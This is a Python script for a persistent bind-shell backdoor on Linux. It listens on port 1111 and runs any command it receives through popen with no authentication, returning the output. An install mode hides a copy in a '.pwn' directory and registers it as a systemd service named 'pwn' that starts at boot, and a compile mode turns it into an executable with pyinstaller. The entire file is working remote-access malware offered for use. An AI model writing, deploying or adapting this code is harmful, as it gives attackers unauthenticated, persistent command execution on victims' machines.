from socket import *
from threading import Thread
from os import popen, chdir, getcwd, getlogin, remove, system, name, mkdir
from sys import argv, exit, version_info


class Listener:
    Server = socket(AF_INET,SOCK_STREAM)
    ip = '0.0.0.0'
    port = 1111

    Server.bind((ip, port))
    Server.listen(1)
    #Thread(target=Server.listen, args=(True,)).start()
    #Client, Addr = Server.accept()

    def __init__(self):

        try:
            self.get_method = argv[1]
            if not self.check_os(name):
                print('Work on Linux only !')
                exit(True)

        except IndexError:
            x = argv[0]
            if not self.check_os(name):
                system('cls')
                print('Work on linux Only')
                exit(True)
            system('clear')
            print("-> For install as a service - python {} install <-".format(x))
            print("-> For Compile to Executable File - python {} compile <-".format(argv[0]))
            print("-> For run as a script - python {} run <-".format(argv[0]))
            exit(True)
            
            
        if argv[1] == 'install':
            self.install_file(pwd=str(popen('pwd').read().replace('\n', '')), filename=str(argv[0]),
            version=float('{}.{}'.format(version_info[0], version_info[1])))
        
        elif argv[1] == 'run':
            self.run_service()
        
        elif argv[1] == 'compile':
            system('pyinstaller -F {}'.format(argv[0]))
            system('clear')
            try:
                open('{}/dist/{}'.format(str(popen('pwd').read()).replace('\n', ''), str(argv[0]).split('.')[0]), mode="r")
            except IOError:
                system('clear')
                print('first install Pyinstaller')
                print('Command -> python3 -m pip install pyinstaller')
                exit(True)
            
            print('File Compiled')
            print('File Directory -> {}/dist/{}'.format(
                str(popen('pwd').read()).replace('\n', ''), str(argv[0]).split('.')[0]
            ))
            exit(True)
    

    def run_service(self):
        Client, Addr = self.Server.accept()
        while True:
            get_cmd = Client.recv(1024)
            Result = 'Command Not found'

            run_command = popen(get_cmd.decode('utf-8')).read()
            Result = run_command
            
            Client.send(bytes(Result, 'utf-8'))



    
    def install_file(self, pwd, filename, version):
        try:
            try:
                mkdir('.pwn')
            except:
                system('rm -rf .pwn')
            finally:
                mkdir('.pwn')
            
            system('cp -r {}/{} .pwn/'.format(pwd, filename))
            chdir('.pwn')
            if version < 3.6:
                system('clear')
                print('Just work in python 3.6 +')
                exit(True)
            
            with open('.run', mode='w') as _:
                _.write('python {}/{} run'.format(pwd, filename))
                _.close()
            
            with open('/etc/systemd/system/pwn.service', mode="w") as _x:
                _x.write(
                    '''
[Unit]
Description=Pwn daemon

[Service]
ExecStart=/bin/bash {}/.pwn/.run
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=pwn

[Install]
WantedBy=multi-user.target
                    '''.format(
                        pwd
                    )
                )
                _x.close()
                system('systemctl enable pwn ; systemctl start pwn')
        except PermissionError:
            system('clear')
            print('Run Service as root permission')
            exit(True)
        
        system('clear')
        print('Service Started ...')
        print('You Can stop service with this command -> systemctl stop pwn')
        exit(True)


        


    def check_os(self, osname):
        if osname == 'nt':
            return False
        else:
            return True

if __name__ == '__main__':
    run = Listener()
